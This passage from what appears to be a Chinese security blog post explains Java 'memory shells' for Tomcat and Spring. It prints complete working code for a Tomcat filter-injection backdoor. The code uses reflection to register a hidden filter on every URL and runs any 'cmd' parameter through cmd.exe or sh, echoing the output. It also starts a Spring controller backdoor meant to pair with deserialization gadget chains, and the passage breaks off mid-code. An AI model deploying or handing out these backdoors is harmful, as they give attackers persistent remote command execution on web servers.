lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">wrap_same_object1</span> <span class="operator">=</span> wrap_same_object.getBoolean(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; requestThreadLocal = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; responseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            wrap_same_object.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> responseThreadLocal.get();</span><br><span class="line">            servletResponse.getWriter().write(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>搭配filter</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/halfDemo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_Half_WithFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">wrap_same_object</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            wrap_same_object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//修改final</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">wrap_same_object1</span> <span class="operator">=</span> wrap_same_object.getBoolean(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; requestThreadLocal = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; responseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            wrap_same_object.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> responseThreadLocal.get();</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> requestThreadLocal.get();</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();  <span class="comment">//这里实际获取到的是ApplicationContextFacade</span></span><br><span class="line">            <span class="keyword">if</span> (servletContext!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//编写恶意Filter</span></span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">ShellIntInject</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;start with cmd=&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(cmdParamName);</span><br><span class="line">                        <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                            String[] cmds = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                            writer.write(output);</span><br><span class="line">                            writer.flush();</span><br><span class="line">                            writer.close();</span><br><span class="line">                        &#125;</span><br><span class="line">                        filterChain.doFilter(request, response);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//获取ApplicationContext</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (ApplicationContext)context.get(servletContext);</span><br><span class="line">                <span class="comment">//获取standardContext</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> ApplicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(ApplicationContext);</span><br><span class="line">                <span class="comment">//获取LifecycleBase的state修改为org.apache.catalina.LifecycleState.STARTING_PREP</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">state</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                state.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                <span class="comment">//注册filterName</span></span><br><span class="line">                FilterRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> ApplicationContext.addFilter(filterName, <span class="keyword">new</span> <span class="title class_">ShellIntInject</span>());</span><br><span class="line">                <span class="comment">//添加拦截路径，实现是将存储写入到filterMap中</span></span><br><span class="line">                registration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line">                <span class="comment">//调用filterStart方法将filterconfig进行添加</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">filterStart</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStart.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                filterStart.invoke(standardContext,<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//移动filter为位置到前面</span></span><br><span class="line">                FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                        org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                        filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                        filterMaps[<span class="number">0</span>] = filterMap;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(<span class="string">&quot;TomcatEcho_HalfWithFilter injection successful!\nGo to /koishi with ParamName \&quot;cmd\&quot; for farther operation&quot;</span>);</span><br><span class="line">                state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p><strong>shiro</strong></p>
<blockquote>
<p>在shiro反序列化漏洞的利用中并不能成功，发现request，response的设置是在漏洞触发点之后，所以在触发漏洞执行任意java代码时获取不到我们想要的response。其原因是因为rememberMe功能的实现是使用了自己实现的filter。</p>
</blockquote>
<p><strong>Tomcat10</strong></p>
<p>HttpServletRequest 与 tomcat789 调用的依赖不同</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import jakarta.servlet.*;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br></pre></td></tr></table></figure></div>



<p><strong>Tomcat7</strong></p>
<p>FilterDef 与 FilterMap 在 tomcat8910 中调用依赖不同</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.util.descriptor.web.FilterDef</span><br><span class="line">org.apache.tomcat.util.descriptor.web.FilterMap</span><br></pre></td></tr></table></figure></div>



<h2 id="六、Spring-Controller-内存马"><a href="#六、Spring-Controller-内存马" class="headerlink" title="六、Spring Controller 内存马"></a>六、Spring Controller 内存马</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/wycm/SpringMVC-Demo/blob/master/SpringMVC%E6%BA%90%E7%A0%81%E4%B9%8BController%E6%9F%A5%E6%89%BE%E5%8E%9F%E7%90%86.md" >SpringMVC 部分讲解 和 registerHandlerMethod方法简单总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="SpringMVC初始化过程"><a href="#SpringMVC初始化过程" class="headerlink" title="SpringMVC初始化过程"></a><strong>SpringMVC初始化过程</strong></h3><p>跟着文章思路，自己debug进去看，大概写个流程</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingHandlerMapping#afterPropertiesSet -&gt; </span><br><span class="line">AbstractHandlerMethodMapping#afterPropertiesSet -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#initHandlerMethods -&gt;</span><br><span class="line"><span class="comment">// 从applicationContext中扫描beans，然后从bean中查找并注册处理器方法</span></span><br><span class="line">AbstractHandlerMethodMapping#processCandidateBean -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#isHandler -&gt;</span><br><span class="line"><span class="comment">// isHandler会根据bean来判断bean定义中是否带有Controller注解或RequestMapping注解</span></span><br><span class="line">AbstractHandlerMethodMapping#detectHandlerMethods -&gt;</span><br><span class="line">AbstractHandlerMethodMapping#getMappingForMethod -&gt;</span><br><span class="line"><span class="comment">// 根据handler method方法创建RequestMappingInfo对象</span></span><br><span class="line">AbstractHandlerMethodMapping#registerHandlerMethod -&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong><code>registerHandlerMethod</code>方法简单总结</strong></p>
<blockquote>
<ol>
<li>检查<code>RequestMapping</code>注解配置是否有歧义。</li>
<li>构建<code>RequestMappingInfo</code>到<code>HandlerMethod</code>的映射map。该map便是<code>AbstractHandlerMethodMapping</code>的成员变量<code>handlerMethods</code>。<code>LinkedHashMap``&lt;RequestMappingInfo,HandlerMethod&gt;</code></li>
<li>构建<code>AbstractHandlerMethodMapping</code>的成员变量<code>urlMap</code>，<code>MultiValueMap</code>&lt;<code>String</code>,<code>RequestMappingInfo</code>&gt;。这个数据结构可以把它理解成Map&lt;String,List&gt;。其中String类型的key存放的是处理方法上<code>RequestMapping</code>注解的value。就是具体的<code>uri</code> 先有如下<code>Controller</code></li>
</ol>
</blockquote>
<h3 id="查找过程"><a href="#查找过程" class="headerlink" title="查找过程"></a>查找过程</h3><blockquote>
<p>web容器（Tomcat、jetty）接收请求后，交给DispatcherServlet处理。FrameworkServlet调用对应请求方法（eg:get调用doGet），然后调用processRequest方法。进入processRequest方法后，一系列处理后，在line:936进入doService方法。然后在Line856进入doDispatch方法。在line:896获取当前请求的处理器handler。然后进入AbstractHandlerMethodMapping的lookupHandlerMethod方法。代码如下</p>
</blockquote>
<p><strong>lookupHandlerMethod</strong></p>
<ul>
<li><p>根据lookupPath，也就是请求的uri。直接查找urlMap，获取直接匹配的RequestMappingInfo list</p>
</li>
<li><p>代码里可以看出，匹配的先后顺序是value&gt;params&gt;headers&gt;consumes&gt;produces&gt;methods&gt;custom</p>
</li>
<li><p>当通过urlMap获取不到直接匹配value的RequestMappingInfo时才会走通配符匹配进入addMatchingMappings方法。</p>
</li>
<li><p>在 MappingRegistry.urlLookup 中获取直接匹配的 RequestMappingInfos</p>
</li>
<li><p>如果没有，则遍历所有的 MappingRegistry.mappingLookup 中保存的 RequestMappingInfos</p>
</li>
<li><p>获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod</p>
</li>
</ul>
<h3 id="Controller-注册进一步学习"><a href="#Controller-注册进一步学习" class="headerlink" title="Controller 注册进一步学习"></a>Controller 注册进一步学习</h3><p><a class="link"   target="_blank" rel="noopener" href="https://landgrey.me/blog/12/" >LandGrey’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>综上，可以了解到：每个具体的 <code>DispatcherServlet</code> 创建的是一个 <code>Child Context</code>，代表一个独立的 <code>IoC 容器</code>；而 <code>ContextLoaderListener</code> 所创建的是一个 <code>Root Context</code>，代表全局唯一的一个公共 <code>IoC 容器</code></p>
<p>如果要访问和操作 <code>bean</code> ，一般要获得当前代码执行环境的<code>IoC 容器</code> 代表者 <code>ApplicationContext</code></p>
</blockquote>
<p><strong>技术实现：</strong></p>
<h4 id="1-获得当前代码运行时的上下文环境"><a href="#1-获得当前代码运行时的上下文环境" class="headerlink" title="1.获得当前代码运行时的上下文环境"></a>1.获得当前代码运行时的上下文环境</h4><p>方法一：<code>getCurrentWebApplicationContext</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure></div>



<p>方法二：<code>WebApplicationContextUtils</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure></div>



<p>方法三：<code>RequestContextUtils</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure></div>



<p>方法四：<code>getAttribute</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></pre></td></tr></table></figure></div>

<p><strong>而对于获取上下文来说，推荐使用第三、四种方法。前两种可能会获取不到<code>RequestMappingHandlerMapping</code>实例</strong></p>
<h4 id="2-手动注册-controller"><a href="#2-手动注册-controller" class="headerlink" title="2.手动注册 controller"></a>2.手动注册 controller</h4><p>Spring 2.5 开始到 Spring 3.1 之前一般使用 <code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code> 映射器 ；</p>
<p>Spring 3.1 开始及以后一般开始使用新的 <code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持<code>@Contoller</code>和<code>@RequestMapping</code>注解。</p>
<p>当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 <code>bean</code>。又因版本不同和较多的接口等原因，手工注册动态 <code>controller</code> 的方法不止一种。</p>
<p><strong>注:</strong>  <code>@RestController</code>注解缺失会导致500错误、无回显</p>
<h4 id="3-controller的缺点"><a href="#3-controller的缺点" class="headerlink" title="3. controller的缺点"></a>3. controller的缺点</h4><p>在对于存在相关的拦截器的时候，controller内存马就无法进行利用，原因就在于拦截器的调用顺序在controller之前，所以controller不能作为通用的内存马来进行使用。</p>
<h3 id="Spring-Controller-内存马代码"><a href="#Spring-Controller-内存马代码" class="headerlink" title="Spring Controller 内存马代码"></a>Spring Controller 内存马代码</h3><p><a class="link"   target="_blank" rel="noopener" href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller" >Spring 内存马实现 | MYZXCG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（一下内存马配合可以加载字节码的 gadget 使用，常见的有 CB1 , CC2 , CC11 , fastjson_Templates 链 ）</p>
<p><strong>KoishiEvilController</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.Controller.koishi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> 